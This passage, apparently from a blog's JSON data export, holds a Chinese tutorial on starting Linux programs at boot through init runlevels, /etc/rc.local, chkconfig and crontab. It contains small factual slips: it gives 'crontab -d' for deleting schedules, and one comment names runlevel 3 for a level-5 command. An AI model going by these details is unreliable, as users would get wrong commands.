nginx\n\n#让mysql服务在命令行模式，随系统启动\nchkconfig --level 3 mysql on\n\n#取消mysql service在runlevel3的自动启动设置\nchkconfig --level 5 mysql off\n\n#查看哪些程序被添加为自启动，即查看这个文件中添加了哪些程序路径\ncat /etc/rc.local\n\n```\n\n### 三、crontab\n通过crontab可以设定程序的执行时间表，例如让程序在每天的8点，或者每个星期一的10点执行一次。\ncrontab -l 列出时间表；\ncrontab -e编辑时间表；\ncrontab -d删除时间表；\n \n“-l”就是一个查看而已；\n“-e”是编辑，和vi没什么差别（其实就是用vi编辑一个特定文件）；\n“-d”基本不用，因为它把该用户所有的时间表都删除了，一般都是用“-e”编辑把不要了的时间表逐行删除；\n \n那到底该如何编辑呢？\n \ncrontab文件的格式是：M H D m d CMD。\n一个6个字段，其中最后一个CMD就是所要执行的程序，如haha.sh。\nM：分钟（0-59）\nH：小时（0-23）\nD：日期（1-31）\nm：月份（1-12）\nd：一个星期中的某天（0-6，0代表周日）\n \n这5个时间字段用空格隔开，其值可以是一个数字，也可以用逗号隔开的多个数字（或其他） ，如果不需设置，则默认为“*”。\n \n例如，每天的8点5分执行haha.sh，就是“5 8 * * * /opt/./haha.sh”。\n \n好像和“开机程序自动启动”扯远了，现在回归正题。\n**其实上面介绍的crontab的功能已经具备了开机自动启动的能力，可以写一个监测脚本，每5分钟执行一次（*/5 * * * * ./haha.sh），如果程序不在了就重新启动一次。**","source":"_posts/Linux开机启动程序详解.md","raw":"---\ntitle: Linux开机启动程序详解\ncategories:\n  - 运维部署\ndate: 2016-9-6 22:41:19\ntoc: false\n\n---\n\n### init进程\ninit进程是非内核进程中第一个被启动运行的，因此它的进程编号PID的值总是1。init读它的配置文件/etc/inittab，决定需要启动的运行级别(Runlevel)。从根本上说，运行级别规定了整个系统的行为，每个级别(分别由0到6的整数表示)满足特定的目的。如果定义了initdefault级别，这个值就直接被选中，否则需要由用户输入一个代表运行级别的数值。\n输入代表运行级别的数字之后，init根据/etc/inittab文件中的定义执行一个命令脚本程序。缺省的运行级别取决于安装阶段对登录程序的选择：是使用基于文本的，还是使用基于X-Window的登录程序。\nrc命令脚本程序我们已经知道，当运行级别发生改变时，将由/etc/inittab文件定义需要运行哪一个命令脚本程序。这些命令脚本程序负责启动或者停止该运行级别特定的各种服务。由于需要管理的服务数量很多，因此需要使用rc命令脚本程序。其中，最主要的一个是/etc/rc.d/rc，它负责为每一个运行级别按照正确的顺序调用相应的命令脚本程序。我们可以想象，这样一个命令脚本程序很容易变得难以控制！为了防止这类事件的发生，需要使用精心设计的方案。\n\n<!-- more -->\n\n对每一个运行级别来说，在/etc/rc.d子目录中都有一个对应的下级目录。这些运行级别的下级子目录的命名方法是rcX.d，其中的X就是代表运行级别的数字。比如说，运行级别3的全部命令脚本程序都保存在/etc/rc.d/rc3.d子目录中。在各个运行级别的子目录中，都建立有到/etc/rc.d/init.d子目录中命令脚本程序的符号链接，但是，这些符号链接并不使用命令脚本程序在/etc/rc.d/init.d子目录中原来的名字。如果命令脚本程序是用来启动一个服务的，其符号链接的名字就以字母S打头；如果命令脚本程序是用来关闭一个服务的，其符号链接的名字就以字母K打头。\n许多情况下，这些命令脚本程序的执行顺序都很重要。如果没有先配置网络接口，就没有办法使用DNS服务解析主机名！为了安排它们的执行顺序，在字母S或者K的后面紧跟着一个两位数字，数值小的在数值大的前面执行。比如：/etc/rc.d/rc3.d/S50inet就会在/etc/rc.d/rc3.d/S55named之前执行(S50inet配置网络设置，55named启动DNS服务器)。存放在/etc/rc.d/init.d子目录中的、被符号链接上的命令脚本程序是真正的实干家，是它们完成了启动或者停止各种服务的操作过程。当/etc/rc.d/rc运行通过每个特定的运行级别子目录的时候，它会根据数字的顺序依次调用各个命令脚本程序执行。它先运行以字母K打头的命令脚本程序，然后再运行以字母S打头的命令脚本程序。对以字母K打头的命令脚本程序来说，会传递Stop参数；类似地对以字母S打头的命令脚本程序来说，会传递Start参数。编写自己的rc命令脚本在维护Linux系统运转的日子里，肯定会遇到需要系统管理员对开机或者关机命令脚\n本进行修改的情况。\n\n### 一、/etc/rc.d/rc.local\n这是一个最简单的方法，编辑“/etc/rc.d/rc.local(链接地址为/etc/rc.local)”，把启动程序的shell命令输入进去即可，输入命令的全路径，类似于windows下的“启动”。\n\n```bash\n#在centos7中,/etc/rc.d/rc.local文件的权限被降低了,开机的时候执行自己的脚本是不能起动一些服务的,执行下面的命令可以将文件标记为可执行的文件\nchmod +x /etc/rc.d/rc.local\n\nvim /etc/rc.d/rc.local\n\n# 文件最后添加可执行脚本\n/data/run/script/start-service.sh\n\n#在脚本中输入启动服务的命令，如开机启动tomcat\n#!/bin/bash\nexport JDK_HOME=/home/java/jdk1.8.0_91\nexport JAVA_HOME=/home/java/jdk1.8.0_91\n/home/tomcat/apache-tomcat-8.0.36/bin/startup.sh\n\n#赋予执行权限\nchmod +x /data/run/script/start-service.sh\n```\n\n这样，start-service.sh脚本在开机的时候就会被执行了,以后自启动服务可以直接添加在该脚本中。\n\n### 二、chkconfig\n```bash\n# 查看nginx服务启动选项的配置状态\nchkconfig --list | grep nginx\n\n# 0 - 停机\n# 1 - 单用户模式 \n# 2 - 多用户，没有NFS \n# 3 - 完全多用户模式(标准的运行级，命令行模式启动) \n# 4 - 没有用到 \n# 5 - X11(xwindow，图形界面启动) \n# 6 - 重新启动 \n# 运行级别最常用的设置为2,3,5\nnginx   0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:off\n\n#添加系统服务\nchkconfig --add nginx\n\n#删除系统服务\nchkconfig --del nginx\n\n#让mysql服务在命令行模式，随系统启动\nchkconfig --level 3 mysql on\n\n#取消mysql service在runlevel3的自动启动设置\nchkconfig --level 5 mysql off\n\n#查看哪些程序被添加为自启动，即查看这个文件中添加了哪些程序路径\ncat /etc/rc.local\n\n```\n\n### 三、crontab\n通过crontab可以设定程序的执行时间表，例如让程序在每天的8点，或者每个星期一的10点执行一次。\ncrontab -l 列出时间表；\ncrontab -e编辑时间表；\ncrontab -d删除时间表；\n \n“-l”就是一个查看而已；\n“-e”是编辑，和vi没什么差别（其实就是用vi编辑一个特定文件）；\n“-d”基本不用，因为它把该用户所有的时间表都删除了，一般都是用“-e”编辑把不要了的时间表逐行删除；\n \n那到底该如何编辑呢？\n \ncrontab文件的格式是：M H D m d CMD。\n一个6个字段，其中最后一个CMD就是所要执行的程序，如haha.sh。\nM：分钟（0-59）\nH：小时（0-23）\nD：日期（1-31）\nm：月份（1-12）\nd：一个星期中的某天（0-6，0代表周日）\n \n这5个时间字段用空格隔开，其值可以是一个数字，也可以用逗号隔开的多个数字（或其他） ，如果不需设置，则默认为“*”。\n \n例如，每天的8点5分执行haha.sh，就是“5 8 * * * /opt/./haha.sh”。\n \n好像和“开机程序自动启动”扯远了，现在回归正题。\n**其实上面介绍的crontab的功能已经具备了开机自动启动的能力，可以写一个监测脚本，每5分钟执行一次（*/5 * * * * ./haha.sh），如果程序不在了就重新启动一次。**","slug":"Linux开机启动程序详解","published":1,"updated":"2016-11-18T01:17:04.152Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulb4000xgwtm9vjku6j9","content":"<h3 id=\"init&#x8FDB;&#x7A0B;\"><a href=\"#init&#x8FDB;&#x7A0B;\" class=\"headerlink\" title=\"init&#x8FDB;&#x7A0B;\"></a>init&#x8FDB;&#x7A0B;</h3><p>init&#x8FDB;&#x7A0B;&#x662F;&#x975E;&#x5185;&#x6838;&#x8FDB;&#x7A0B;&#x4E2D;&#x7B2C;&#x4E00;&#x4E2A;&#x88AB;&#x542F;&#x52A8;&#x8FD0;&#x884C;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x5B83;&#x7684;&#x8FDB;&#x7A0B;&#x7F16;&#x53F7;PID&#x7684;&#x503C;&#x603B;&#x662F;1&#x3002;init&#x8BFB;&#x5B83;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;/etc/inittab&#xFF0C;&#x51B3;&#x5B9A;&#x9700;&#x8981;&#x542F;&#x52A8;&#x7684;&#x8FD0;&#x884C;&#x7EA7;&#x522B;(Runlevel)&#x3002;&#x4ECE;&#x6839;&#x672C;&#x4E0A;&#x8BF4;&#xFF0C;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x89C4;&#x5B9A;&#x4E86;&#x6574;&#x4E2A;&#x7CFB;&#x7EDF;&#x7684;&#x884C;&#x4E3A;&#xFF0C;&#x6BCF;&#x4E2A;&#x7EA7;&#x522B;(&#x5206;&#x522B;&#x7531;0&#x5230;6&#x7684;&#x6574;&#x6570;&#x8868;&#x793A;)&#x6EE1;&#x8DB3;&#x7279;&#x5B9A;&#x7684;&#x76EE;&#x7684;&#x3002;&#x5982;&#x679C;&#x5B9A;&#x4E49;&#x4E86;initdefault&#x7EA7;&#x522B;&#xFF0C;&#x8FD9;&#x4E2A;&#x503C;&#x5C31;&#x76F4;&#x63A5;&#x88AB;&#x9009;&#x4E2D;&#xFF0C;&#x5426;&#x5219;&#x9700;&#x8981;&#x7531;&#x7528;&#x6237;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x4EE3;&#x8868;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x7684;&#x6570;&#x503C;&#x3002;<br>&#x8F93;&#x5165;&#x4EE3;&#x8868;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x7684;&#x6570;&#x5B57;&#x4E4B;&#x540E;&#xFF0C;init&#x6839;&#x636E;/etc/inittab&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x5B9A;&#x4E49;&#x6267;&#x884C;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x3002;&#x7F3A;&#x7701;&#x7684;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x53D6;&#x51B3;&#x4E8E;&#x5B89;&#x88C5;&#x9636;&#x6BB5;&#x5BF9;&#x767B;&#x5F55;&#x7A0B;&#x5E8F;&#x7684;&#x9009;&#x62E9;&#xFF1A;&#x662F;&#x4F7F;&#x7528;&#x57FA;&#x4E8E;&#x6587;&#x672C;&#x7684;&#xFF0C;&#x8FD8;&#x662F;&#x4F7F;&#x7528;&#x57FA;&#x4E8E;X-Window&#x7684;&#x767B;&#x5F55;&#x7A0B;&#x5E8F;&#x3002;<br>rc&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x77E5;&#x9053;&#xFF0C;&#x5F53;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x53D1;&#x751F;&#x6539;&#x53D8;&#x65F6;&#xFF0C;&#x5C06;&#x7531;/etc/inittab&#x6587;&#x4EF6;&#x5B9A;&#x4E49;&#x9700;&#x8981;&#x8FD0;&#x884C;&#x54EA;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x3002;&#x8FD9;&#x4E9B;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x8D1F;&#x8D23;&#x542F;&#x52A8;&#x6216;&#x8005;&#x505C;&#x6B62;&#x8BE5;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x7279;&#x5B9A;&#x7684;&#x5404;&#x79CD;&#x670D;&#x52A1;&#x3002;&#x7531;&#x4E8E;&#x9700;&#x8981;&#x7BA1;&#x7406;&#x7684;&#x670D;&#x52A1;&#x6570;&#x91CF;&#x5F88;&#x591A;&#xFF0C;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x4F7F;&#x7528;rc&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x3002;&#x5176;&#x4E2D;&#xFF0C;&#x6700;&#x4E3B;&#x8981;&#x7684;&#x4E00;&#x4E2A;&#x662F;/etc/rc.d/rc&#xFF0C;&#x5B83;&#x8D1F;&#x8D23;&#x4E3A;&#x6BCF;&#x4E00;&#x4E2A;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x6309;&#x7167;&#x6B63;&#x786E;&#x7684;&#x987A;&#x5E8F;&#x8C03;&#x7528;&#x76F8;&#x5E94;&#x7684;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x3002;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x60F3;&#x8C61;&#xFF0C;&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x5F88;&#x5BB9;&#x6613;&#x53D8;&#x5F97;&#x96BE;&#x4EE5;&#x63A7;&#x5236;&#xFF01;&#x4E3A;&#x4E86;&#x9632;&#x6B62;&#x8FD9;&#x7C7B;&#x4E8B;&#x4EF6;&#x7684;&#x53D1;&#x751F;&#xFF0C;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x7CBE;&#x5FC3;&#x8BBE;&#x8BA1;&#x7684;&#x65B9;&#x6848;&#x3002;</p>\n<a id=\"more\"></a>\n<p>&#x5BF9;&#x6BCF;&#x4E00;&#x4E2A;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x6765;&#x8BF4;&#xFF0C;&#x5728;/etc/rc.d&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#x90FD;&#x6709;&#x4E00;&#x4E2A;&#x5BF9;&#x5E94;&#x7684;&#x4E0B;&#x7EA7;&#x76EE;&#x5F55;&#x3002;&#x8FD9;&#x4E9B;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x7684;&#x4E0B;&#x7EA7;&#x5B50;&#x76EE;&#x5F55;&#x7684;&#x547D;&#x540D;&#x65B9;&#x6CD5;&#x662F;rcX.d&#xFF0C;&#x5176;&#x4E2D;&#x7684;X&#x5C31;&#x662F;&#x4EE3;&#x8868;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x7684;&#x6570;&#x5B57;&#x3002;&#x6BD4;&#x5982;&#x8BF4;&#xFF0C;&#x8FD0;&#x884C;&#x7EA7;&#x522B;3&#x7684;&#x5168;&#x90E8;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x90FD;&#x4FDD;&#x5B58;&#x5728;/etc/rc.d/rc3.d&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#x3002;&#x5728;&#x5404;&#x4E2A;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x7684;&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x90FD;&#x5EFA;&#x7ACB;&#x6709;&#x5230;/etc/rc.d/init.d&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x7684;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#xFF0C;&#x4F46;&#x662F;&#xFF0C;&#x8FD9;&#x4E9B;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#x5E76;&#x4E0D;&#x4F7F;&#x7528;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x5728;/etc/rc.d/init.d&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#x539F;&#x6765;&#x7684;&#x540D;&#x5B57;&#x3002;&#x5982;&#x679C;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x662F;&#x7528;&#x6765;&#x542F;&#x52A8;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x7684;&#xFF0C;&#x5176;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#x7684;&#x540D;&#x5B57;&#x5C31;&#x4EE5;&#x5B57;&#x6BCD;S&#x6253;&#x5934;&#xFF1B;&#x5982;&#x679C;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x662F;&#x7528;&#x6765;&#x5173;&#x95ED;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x7684;&#xFF0C;&#x5176;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#x7684;&#x540D;&#x5B57;&#x5C31;&#x4EE5;&#x5B57;&#x6BCD;K&#x6253;&#x5934;&#x3002;<br>&#x8BB8;&#x591A;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8FD9;&#x4E9B;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x7684;&#x6267;&#x884C;&#x987A;&#x5E8F;&#x90FD;&#x5F88;&#x91CD;&#x8981;&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x5148;&#x914D;&#x7F6E;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#xFF0C;&#x5C31;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x4F7F;&#x7528;DNS&#x670D;&#x52A1;&#x89E3;&#x6790;&#x4E3B;&#x673A;&#x540D;&#xFF01;&#x4E3A;&#x4E86;&#x5B89;&#x6392;&#x5B83;&#x4EEC;&#x7684;&#x6267;&#x884C;&#x987A;&#x5E8F;&#xFF0C;&#x5728;&#x5B57;&#x6BCD;S&#x6216;&#x8005;K&#x7684;&#x540E;&#x9762;&#x7D27;&#x8DDF;&#x7740;&#x4E00;&#x4E2A;&#x4E24;&#x4F4D;&#x6570;&#x5B57;&#xFF0C;&#x6570;&#x503C;&#x5C0F;&#x7684;&#x5728;&#x6570;&#x503C;&#x5927;&#x7684;&#x524D;&#x9762;&#x6267;&#x884C;&#x3002;&#x6BD4;&#x5982;&#xFF1A;/etc/rc.d/rc3.d/S50inet&#x5C31;&#x4F1A;&#x5728;/etc/rc.d/rc3.d/S55named&#x4E4B;&#x524D;&#x6267;&#x884C;(S50inet&#x914D;&#x7F6E;&#x7F51;&#x7EDC;&#x8BBE;&#x7F6E;&#xFF0C;55named&#x542F;&#x52A8;DNS&#x670D;&#x52A1;&#x5668;)&#x3002;&#x5B58;&#x653E;&#x5728;/etc/rc.d/init.d&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x3001;&#x88AB;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#x4E0A;&#x7684;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x662F;&#x771F;&#x6B63;&#x7684;&#x5B9E;&#x5E72;&#x5BB6;&#xFF0C;&#x662F;&#x5B83;&#x4EEC;&#x5B8C;&#x6210;&#x4E86;&#x542F;&#x52A8;&#x6216;&#x8005;&#x505C;&#x6B62;&#x5404;&#x79CD;&#x670D;&#x52A1;&#x7684;&#x64CD;&#x4F5C;&#x8FC7;&#x7A0B;&#x3002;&#x5F53;/etc/rc.d/rc&#x8FD0;&#x884C;&#x901A;&#x8FC7;&#x6BCF;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x5B50;&#x76EE;&#x5F55;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5B83;&#x4F1A;&#x6839;&#x636E;&#x6570;&#x5B57;&#x7684;&#x987A;&#x5E8F;&#x4F9D;&#x6B21;&#x8C03;&#x7528;&#x5404;&#x4E2A;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x6267;&#x884C;&#x3002;&#x5B83;&#x5148;&#x8FD0;&#x884C;&#x4EE5;&#x5B57;&#x6BCD;K&#x6253;&#x5934;&#x7684;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x8FD0;&#x884C;&#x4EE5;&#x5B57;&#x6BCD;S&#x6253;&#x5934;&#x7684;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x3002;&#x5BF9;&#x4EE5;&#x5B57;&#x6BCD;K&#x6253;&#x5934;&#x7684;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x6765;&#x8BF4;&#xFF0C;&#x4F1A;&#x4F20;&#x9012;Stop&#x53C2;&#x6570;&#xFF1B;&#x7C7B;&#x4F3C;&#x5730;&#x5BF9;&#x4EE5;&#x5B57;&#x6BCD;S&#x6253;&#x5934;&#x7684;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x6765;&#x8BF4;&#xFF0C;&#x4F1A;&#x4F20;&#x9012;Start&#x53C2;&#x6570;&#x3002;&#x7F16;&#x5199;&#x81EA;&#x5DF1;&#x7684;rc&#x547D;&#x4EE4;&#x811A;&#x672C;&#x5728;&#x7EF4;&#x62A4;Linux&#x7CFB;&#x7EDF;&#x8FD0;&#x8F6C;&#x7684;&#x65E5;&#x5B50;&#x91CC;&#xFF0C;&#x80AF;&#x5B9A;&#x4F1A;&#x9047;&#x5230;&#x9700;&#x8981;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#x5BF9;&#x5F00;&#x673A;&#x6216;&#x8005;&#x5173;&#x673A;&#x547D;&#x4EE4;&#x811A;<br>&#x672C;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#x7684;&#x60C5;&#x51B5;&#x3002;</p>\n<h3 id=\"&#x4E00;&#x3001;-etc-rc-d-rc-local\"><a href=\"#&#x4E00;&#x3001;-etc-rc-d-rc-local\" class=\"headerlink\" title=\"&#x4E00;&#x3001;/etc/rc.d/rc.local\"></a>&#x4E00;&#x3001;/etc/rc.d/rc.local</h3><p>&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x6700;&#x7B80;&#x5355;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x7F16;&#x8F91;&#x201C;/etc/rc.d/rc.local(&#x94FE;&#x63A5;&#x5730;&#x5740;&#x4E3A;/etc/rc.local)&#x201D;&#xFF0C;&#x628A;&#x542F;&#x52A8;&#x7A0B;&#x5E8F;&#x7684;shell&#x547D;&#x4EE4;&#x8F93;&#x5165;&#x8FDB;&#x53BB;&#x5373;&#x53EF;&#xFF0C;&#x8F93;&#x5165;&#x547D;&#x4EE4;&#x7684;&#x5168;&#x8DEF;&#x5F84;&#xFF0C;&#x7C7B;&#x4F3C;&#x4E8E;windows&#x4E0B;&#x7684;&#x201C;&#x542F;&#x52A8;&#x201D;&#x3002;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#&#x5728;centos7&#x4E2D;,/etc/rc.d/rc.local&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x88AB;&#x964D;&#x4F4E;&#x4E86;,&#x5F00;&#x673A;&#x7684;&#x65F6;&#x5019;&#x6267;&#x884C;&#x81EA;&#x5DF1;&#x7684;&#x811A;&#x672C;&#x662F;&#x4E0D;&#x80FD;&#x8D77;&#x52A8;&#x4E00;&#x4E9B;&#x670D;&#x52A1;&#x7684;,&#x6267;&#x884C;&#x4E0B;&#x9762;&#x7684;&#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x5C06;&#x6587;&#x4EF6;&#x6807;&#x8BB0;&#x4E3A;&#x53EF;&#x6267;&#x884C;&#x7684;&#x6587;&#x4EF6;</span></span><br><span class=\"line\">chmod +x /etc/rc.d/rc.local</span><br><span class=\"line\"></span><br><span class=\"line\">vim /etc/rc.d/rc.local</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x6587;&#x4EF6;&#x6700;&#x540E;&#x6DFB;&#x52A0;&#x53EF;&#x6267;&#x884C;&#x811A;&#x672C;</span></span><br><span class=\"line\">/data/run/script/start-service.sh</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x5728;&#x811A;&#x672C;&#x4E2D;&#x8F93;&#x5165;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x5982;&#x5F00;&#x673A;&#x542F;&#x52A8;tomcat</span></span><br><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"built_in\">export</span> JDK_HOME=/home/java/jdk1.8.0_91</span><br><span class=\"line\"><span class=\"built_in\">export</span> JAVA_HOME=/home/java/jdk1.8.0_91</span><br><span class=\"line\">/home/tomcat/apache-tomcat-8.0.36/bin/startup.sh</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x8D4B;&#x4E88;&#x6267;&#x884C;&#x6743;&#x9650;</span></span><br><span class=\"line\">chmod +x /data/run/script/start-service.sh</span><br></pre></td></tr></table></figure>\n<p>&#x8FD9;&#x6837;&#xFF0C;start-service.sh&#x811A;&#x672C;&#x5728;&#x5F00;&#x673A;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x4F1A;&#x88AB;&#x6267;&#x884C;&#x4E86;,&#x4EE5;&#x540E;&#x81EA;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x6DFB;&#x52A0;&#x5728;&#x8BE5;&#x811A;&#x672C;&#x4E2D;&#x3002;</p>\n<h3 id=\"&#x4E8C;&#x3001;chkconfig\"><a href=\"#&#x4E8C;&#x3001;chkconfig\" class=\"headerlink\" title=\"&#x4E8C;&#x3001;chkconfig\"></a>&#x4E8C;&#x3001;chkconfig</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &#x67E5;&#x770B;nginx&#x670D;&#x52A1;&#x542F;&#x52A8;&#x9009;&#x9879;&#x7684;&#x914D;&#x7F6E;&#x72B6;&#x6001;</span></span><br><span class=\"line\">chkconfig --list | grep nginx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 0 - &#x505C;&#x673A;</span></span><br><span class=\"line\"><span class=\"comment\"># 1 - &#x5355;&#x7528;&#x6237;&#x6A21;&#x5F0F; </span></span><br><span class=\"line\"><span class=\"comment\"># 2 - &#x591A;&#x7528;&#x6237;&#xFF0C;&#x6CA1;&#x6709;NFS </span></span><br><span class=\"line\"><span class=\"comment\"># 3 - &#x5B8C;&#x5168;&#x591A;&#x7528;&#x6237;&#x6A21;&#x5F0F;(&#x6807;&#x51C6;&#x7684;&#x8FD0;&#x884C;&#x7EA7;&#xFF0C;&#x547D;&#x4EE4;&#x884C;&#x6A21;&#x5F0F;&#x542F;&#x52A8;) </span></span><br><span class=\"line\"><span class=\"comment\"># 4 - &#x6CA1;&#x6709;&#x7528;&#x5230; </span></span><br><span class=\"line\"><span class=\"comment\"># 5 - X11(xwindow&#xFF0C;&#x56FE;&#x5F62;&#x754C;&#x9762;&#x542F;&#x52A8;) </span></span><br><span class=\"line\"><span class=\"comment\"># 6 - &#x91CD;&#x65B0;&#x542F;&#x52A8; </span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x6700;&#x5E38;&#x7528;&#x7684;&#x8BBE;&#x7F6E;&#x4E3A;2,3,5</span></span><br><span class=\"line\">nginx   0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:off</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x6DFB;&#x52A0;&#x7CFB;&#x7EDF;&#x670D;&#x52A1;</span></span><br><span class=\"line\">chkconfig --add nginx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x5220;&#x9664;&#x7CFB;&#x7EDF;&#x670D;&#x52A1;</span></span><br><span class=\"line\">chkconfig --del nginx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x8BA9;mysql&#x670D;&#x52A1;&#x5728;&#x547D;&#x4EE4;&#x884C;&#x6A21;&#x5F0F;&#xFF0C;&#x968F;&#x7CFB;&#x7EDF;&#x542F;&#x52A8;</span></span><br><span class=\"line\">chkconfig --level 3 mysql on</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x53D6;&#x6D88;mysql service&#x5728;runlevel3&#x7684;&#x81EA;&#x52A8;&#x542F;&#x52A8;&#x8BBE;&#x7F6E;</span></span><br><span class=\"line\">chkconfig --level 5 mysql off</span><br><span class=\"line\"></span><br><span class=\"line\"><span 